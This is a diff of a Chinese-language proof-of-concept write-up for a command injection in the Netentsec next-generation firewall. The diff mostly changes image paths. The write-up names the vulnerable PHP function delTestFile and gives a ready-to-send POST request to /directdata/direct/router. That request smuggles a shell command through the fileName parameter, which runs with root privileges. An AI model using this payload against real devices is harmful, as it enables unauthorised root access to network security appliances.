@@ -20,11 +20,11 @@ app="网康科技-下一代防火墙"
 
 登录页面如下
 
-![image-20230314085835290](images/image-20230314085835290.png)
+![image-20230314085835290](../.gitbook/assets/image-20230314085835290.png)
 
 出现漏洞的文件 applications/Models/NS/Rpc/HeartBeat.php
 
-![image-20230314085853048](images/image-20230314085853048.png)
+![image-20230314085853048](../.gitbook/assets/image-20230314085853048.png)
 
 ```
 public function delTestFile($fileName){
@@ -37,7 +37,7 @@ public function delTestFile($fileName){
 	}
 ```
 
-调用方法 delTestFile，fileName参数可控，调用的 exec_cmd 文件为Root权限文件，构造请求包进行命令执行
+调用方法 delTestFile，fileName参数可控，调用的 exec\_cmd 文件为Root权限文件，构造请求包进行命令执行
 
 ```
 POST /directdata/direct/router HTTP/1.1
@@ -55,8 +55,8 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 {"action":"NS_Rpc_HeartBeat","method":"delTestFile","data": ["/var/www/tmp/1.txt;id>2.txt"],"type":"rpc","tid":11,"f8839p7rqtj":"="}
 ```
 
-![image-20230314085915971](images/image-20230314085915971.png)
+![image-20230314085915971](../.gitbook/assets/image-20230314085915971.png)
 
 访问写入的文件
 
-![image-20230314085928381](images/image-20230314085928381.png)
+![image-20230314085928381](../.gitbook/assets/image-20230314085928381.png)
